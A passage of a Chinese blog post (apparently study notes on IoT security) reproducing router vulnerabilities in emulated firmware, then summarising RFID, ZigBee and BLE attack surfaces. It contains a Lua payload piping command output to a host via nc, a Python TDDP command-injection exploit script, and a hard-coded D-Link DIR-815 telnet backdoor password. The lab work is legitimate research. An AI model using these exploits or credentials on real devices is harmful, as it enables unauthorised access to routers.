+<p>&emsp;上述配置代表关闭守护进程，且文件默认下载目录为<code>/tftpboot</code>。并在宿主机中启动<code>tftp</code>服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start atftpd</span><br></pre></td></tr></table></figure>
+<p><strong>Step3：</strong>创建<code>/tftpboot/payload</code>文件（<code>lua</code>脚本），并写入：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">config_set</span><span class="params">(config)</span></span></span><br><span class="line">	<span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;id | nc 10.10.10.1 1337&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;当<code>qemu</code>虚拟机下载并执行此脚本时，会将自己的<code>id</code>信息发送给宿主机的<code>1337</code>端口。并且在宿主机上运行<code>nc -lnvp 1337</code>监听此端口发来的消息。</p>
+<p><strong>Step4：</strong>之后，宿主机上运行下面的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"><span class="comment"># python3 exp.py 10.10.10.2 payload</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">port_send = <span class="number">1040</span></span><br><span class="line">port_receive = <span class="number">6100</span></span><br><span class="line">tddp_ver = <span class="string">&quot;01&quot;</span></span><br><span class="line">tddp_command = <span class="string">&quot;31&quot;</span></span><br><span class="line">tddp_req = <span class="string">&quot;01&quot;</span></span><br><span class="line">tddp_reply = <span class="string">&quot;00&quot;</span></span><br><span class="line"><span class="comment"># 表示 &quot;0000000000000000&quot;</span></span><br><span class="line">tddp_padding = <span class="string">&quot;%0.16X&quot;</span> % <span class="number">0</span></span><br><span class="line"><span class="comment"># 按照tddp_v1格式构建packet</span></span><br><span class="line">tddp_packet = <span class="string">&quot;&quot;</span>.join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])</span><br><span class="line"><span class="comment"># 定义接收的socket</span></span><br><span class="line">sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">sock_receive.bind((<span class="string">&#x27;&#x27;</span>, port_receive))</span><br><span class="line"><span class="comment"># 定义发送的socket</span></span><br><span class="line">sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">packet = binascii.unhexlify(tddp_packet)</span><br><span class="line">argument = <span class="string">&quot;%s;arbitrary&quot;</span> % sys.argv[<span class="number">2</span>]</span><br><span class="line">packet = packet + argument.encode()</span><br><span class="line">sock_send.sendto(packet, (sys.argv[<span class="number">1</span>], port_send))</span><br><span class="line">sock_send.close()</span><br><span class="line"><span class="comment"># 收取消息</span></span><br><span class="line">resp, addr = sock_receive.recvfrom(<span class="number">1024</span>)</span><br><span class="line">r = resp.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>
+<p><strong>Step3：</strong>但是我没有复现成功，虚拟机显示：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230721221337702.png" alt="image-20230721221337702" style="zoom:67%;" /></p>
+<p>&emsp;画一下实验流程图：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230721222703835.png" alt="image-20230721222703835" style="zoom:67%;" /></p>
+<h3 id="D-Link-DIR-815后门漏洞"><a href="#D-Link-DIR-815后门漏洞" class="headerlink" title="D-Link DIR-815后门漏洞"></a>D-Link DIR-815后门漏洞</h3><p>&emsp;此漏洞使得攻击者可以获得Telnet服务的账号密码，通过该账号密码可以登录该型号路由器的Telnet，并可以执行命令。</p>
+<p>&emsp;与书中不同，我下载的是<code>D-Link DIR-815 1.01</code>，书中是<code>D-Link DIR-815 1.02</code>。此固件我也会放到github中。</p>
+<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>&emsp;由于原理比较简单，所以直接进行模拟：</p>
+<p><strong>Step1：</strong>使用<code>binwalk</code>提取文件系统，并使用<code>firmwalker</code>收集文件系统的信息：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230721223400861.png" alt="image-20230721223400861" style="zoom:40%;" /></p>
+<p><strong>Step2：</strong>跟进<code>S80telnetd.sh</code>。</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230721223548801.png" alt="image-20230721223548801" style="zoom:67%;" /></p>
+<p>&emsp;可以看到，<code>telnet</code>有账户<code>Alphanetworks</code>，其密码为<code>/etc/config/image_sign</code>，继续跟进，发现此文件内容为：<code>wrgnd08_dlob_dir815ss</code>。到此，发现厂商后门密码。</p>
+<h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><strong>Step1：</strong>使用<code>FirmAE</code>模拟此固件，固件模拟的ip地址为<code>192.168.0.1</code>。</p>
+<p><strong>Step2：</strong>在宿主机运行<code>telnet 192.168.0.1</code>，并登陆账号：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230721224848543.png" alt="image-20230721224848543" style="zoom:67%;" /></p>
+<h2 id="0x03-物联网协议安全"><a href="#0x03-物联网协议安全" class="headerlink" title="0x03 物联网协议安全"></a>0x03 物联网协议安全</h2><p>&emsp;由于物联网设备种类非常多，且会考虑到连接范围、电池寿命等因素，因此物联网中会组合使用多种通信协议。常用的通信协议有：RFID、ZigBee、低功耗蓝牙BLE等。由于本章的实验需要购买设备，所以我并未做此章的实验。</p>
+<h3 id="RFID"><a href="#RFID" class="headerlink" title="RFID"></a>RFID</h3><p>&emsp;RFID利用无线射频的方式进行非接触的双向通信，从而达到识别目标与数据交换的目的。RFID的读写速度快、无需接触，常见的RFID应用为公交卡、门禁卡、校园卡等。RFID的组成部分如下：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230719194759754.png" alt="image-20230719194759754" style="zoom:67%;" /></p>
+<p>&emsp;RFID卡分为主动（有电池）和被动（无电池）两种。生活中大多数为被动RFID卡，此时RFID阅读器发送射频信号，RFID卡会获得能量，然后向RFID阅读器发送储存的信息，之后将信息发送给计算机控制系统处理。</p>
+<p>&emsp;根据工作原理的不同，RFID卡分为3类：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/RFID.png" alt="RFID" style="zoom:80%;" /></p>
+<p>&emsp;书中的例子是<code>NXP Mifare S50</code>，它是M1卡，可存储1024字节的数据，工作频率为13.56MHz。此卡与阅读器之间传输数据时，需进行3次认证：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230719202012530.png" alt="image-20230719202012530" style="zoom:67%;" /></p>
+<p>&emsp;在此卡的具体实现中，由于其随机数产生器使用了LFSR，因此产生的随机数是可预测的，可以利用此发起嗅探攻击。</p>
+<p>&emsp;进行RFID嗅探攻击时，需要用到<code>Proxmark</code>硬件工具，其可以允许用户读取、模拟、爆破大多数RFID协议。</p>
+<h3 id="ZigBee"><a href="#ZigBee" class="headerlink" title="ZigBee"></a>ZigBee</h3><p>&emsp;ZigBee是基于IEEE 802.15.4标准的近距离、低功耗、低速率、低成本的双向无线通信技术。其工作频段为：<code>2.4GHz</code>（全球）、<code>868MHz</code>（欧洲）和<code>915MHz</code>（美国），传输速率为<code>250kbit/s</code>、<code>20kbit/s</code>、<code>40kbit/s</code>。传输距离为<code>10m-75m</code>。<code>802.15.4</code>标准成为无线传感器网络领域的事实标准。</p>
+<p>&emsp;<code>IEEE 802.15.4</code>标准包括物理层与介质访问控制层，并定义了两种类型的网络节点，分别为<code>FFD</code>（全功能设备）和<code>RFD</code>（缩减功能设备）。</p>
+<p>（1）<code>FFD</code>可以创建网络、配置路由，并可以当作<code>PAN</code>协调器、路由器和终端设备。<code>FFD</code>可以与网络中的任何<code>RFD</code>或<code>FFD</code>通信。</p>
+<p>（2）<code>RFD</code>是简单设备，缺乏路由能力，并且只能与<code>FFD</code>进行通信。</p>
+<p>&emsp;ZigBee协议层分为：物理层、介质访问控制层、网络层、应用层。其中，物理层与介质访问控制层就是<code>IEEE 802.15.4</code>标准的物理层与介质访问控制层。</p>
+<p>&emsp;设备可以当作<code>PAN</code>协调器、路由器和终端设备。</p>
+<p>&emsp;<code>PAN</code>协调器：在网络中可以充当中心节点，每个网络中只有一个协调器，协调器负责维护关联设备列表、添加关联、解除关联等功能。协调器要始终处于活动状态，不可睡眠。</p>
+<p>&emsp;路由器：具有路由功能。终端设备：没有路由能力，可睡眠。</p>
+<p>&emsp;在ZigBee网络内，信任中心是被其他所有设备信任的某个设备上运行的程序。信任中心可以对加入网络的设备进行验证，为设备分配网络密钥，并且设备也需要从信任中心接收链接密钥。</p>
+<p>&emsp;<code>Zigbee</code>中有两种密钥：</p>
+<p>（1）网络密钥：被网络中的多个设备共享，仅在广播中使用。</p>
+<p>（2）链接密钥：保护两个设备之间单播数据的机密性。</p>
+<p>&emsp;当新设备加入网络时，需要先向信任中心请求加入，此时新设备与信任中心共享的链接密钥是默认的。因此，攻击者可以使用默认链接密钥请求加入网络。</p>
+<p>&emsp;可以使用<code>CC2531 USB Dongle</code>硬件对Zigbee网络中的数据包进行嗅探，前提是需要知道网络密钥（可通过抓包获得）。</p>
+<h3 id="BLE"><a href="#BLE" class="headerlink" title="BLE"></a>BLE</h3><p>&emsp;低功耗蓝牙BLE是一种个人局域网技术，可用于智能手环等设备。与蓝牙相比，其功耗与成本更低。BLE与经典蓝牙有很大差异。</p>
+<p>&emsp;BLE的协议栈如下：</p>
+<p><img src="/images/IOT-security-vulnerabilities-mining/image-20230719210309432.png" alt="image-20230719210309432" style="zoom:67%;" /></p>
+<p>&emsp;上图中重要的部分如下：</p>
+<p>（1）属性协议ATT：定义了访问服务端设备数据的规则，数据存储在属性服务器的属性中，供属性客户端执行读写操作。</p>
+<p>（2）通用蓝牙规范GAP：定义蓝牙设备的角色，定义蓝牙地址、蓝牙名称等。</p>
+<p>（3）通用访问规范GAP：控制设备广播，决定了设备是否可以与交互设备进行通信。</p>
+<p>&emsp;BLE中，有一个很重要的一类文件，叫做通用属性配置文件（GATT），它规定了如何通过BLE来交换配置文件与用户数据。<strong>所有标准的BLE配置文件都以GATT为基础。</strong>虽然ATT中定义了属性，但是GATT则提供了更精细化的属性。<strong>属性被分组为服务，服务可以有多个特征，不同的特征有不同的UUID，每个特征可以包括多个描述符。</strong></p>
+<p>&emsp;例如，智能手环有3中服务：提供设备信息、统计步数、监测心率。提供设备信息的服务中，有厂商信息、硬件信息等特征。在检测心率的服务中，有心率的特征。</p>
+<p>&emsp;BLE设备之间的配对操作是加密的，但是特征中的值可以在不加密的状态下进行读写。我们可以对BLE设备的流量进行抓包，然后分析其中的GATT协议，并修改字段值，并进行重放。</p>
+<p>&emsp;嗅探BLE协议数据包使用的是<code>nRF53832</code>芯片，重放操作使用的是<code>Parani-UD100</code>硬件，在此不做过多赘述。</p>
+
+  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/07/13/OP-TEE-study/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/07/06/Qiling-study/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+
+
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    <!-- 
+    <div id="disqus_thread" class="ds-thread">
+        <script type="text/javascript">
+            /**
+             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+             */
+                /*
+                 var disqus_config = function () {
+                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
+                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                 };
+                 */
+            (function() { // DON'T EDIT BELOW THIS LINE
+                var d = document, s = d.createElement('script');
+
+                s.src = 'https://https-wd-2711-tech.disqus.com/embed.js';
+
+                s.setAttribute('data-timestamp', +new Date());
+                (d.head || d.body).appendChild(s);
+            })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
+                Disqus.</a></noscript>
+    </div> -->
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            appId: 'wLIJ70s3fPvW8WJPgVVAuWVR-gzGzoHsz',
+            appKey: 'NVGqxhUkqtFv2CbwmXXWjCdR'
+        })
+    </script>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-07-10 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/IOT/">IOT<span>4</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+
+	<!-- copyright -->
+	<div>
+    <ul class="post-copyright">
+      <li class="post-copyright-author">
+      <strong>作者:  </strong>wd-z711</a>
+      </li>
+      <li class="post-copyright-link">
+      <strong>文章链接:  </strong>
+      <a href="/" target="_blank" title="">https://wd-2711.tech/</a>
+      </li>
+      <li class="post-copyright-license">
+        <strong>版权声明:   </strong>
+        本博客所有文章除特别声明外，均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+        许可协议。转载请注明出处!
+      </li>
+    </ul>
+  <div>
+ 	
+
+		
+
+
+</div><!-- row -->
+
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2023 wd-z711
+  
+      <!-- with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
+     <br> Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.     -->
+
+     <!-- <script type="text/javascript">
+      (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+      (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+      e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+      })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+      
+      _st('install','aB-vgeB8gEDrnRJuhceL','2.0.0');
+    </script> -->
+    </p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+   </html>
